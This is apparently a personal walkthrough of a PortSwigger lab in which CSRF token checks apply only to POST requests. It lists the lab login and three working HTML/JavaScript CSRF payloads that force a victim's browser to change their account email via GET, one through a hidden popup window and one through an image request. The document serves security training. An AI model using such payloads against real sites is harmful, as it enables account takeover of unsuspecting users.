https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method



This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter






1) login as wiener:peter
2) go on my-account and see that the form for changing the email contains an hidden field that is the csrf token
3) try to change wiener email in a legit way
    it is done in POST method
4) change it in GET using a script in exploit server that performs the request 

    <html>
        <body>
            <script>
                const url = "https://**********LAB-ID*******.web-security-academy.net/my-account/change-email?email=exploit@email.com";
                const x = window.open(url, 'title', 'width= 1, height= 1, left=0, top=0, resizable=no, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no');
                setTimeout(() => x.close(), 1000);
            </script>
       </body>
   </html>


5)It works. so send it to the victim changing the email to exploit2@test.com or something else










use this script in the delivery exploit server

<html>
<body>
<script>
new Image().src = "https://**********LAB-ID*******.web-security-academy.net/my-account/change-email?email=exploit@email.com";
</script>
</body>
</html>

It doesn't work on firefox, in case we can use

<html>
<body>
<script>
    const url = "https://**********LAB-ID*******.web-security-academy.net/my-account/change-email?email=exploit@email.com";
    const x = window.open(url, 'title', 'width= 1, height= 1, left=0, top=0, resizable=no, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no');
    setTimeout(() => x.close(), 1000);
</script>
</body>
</html>
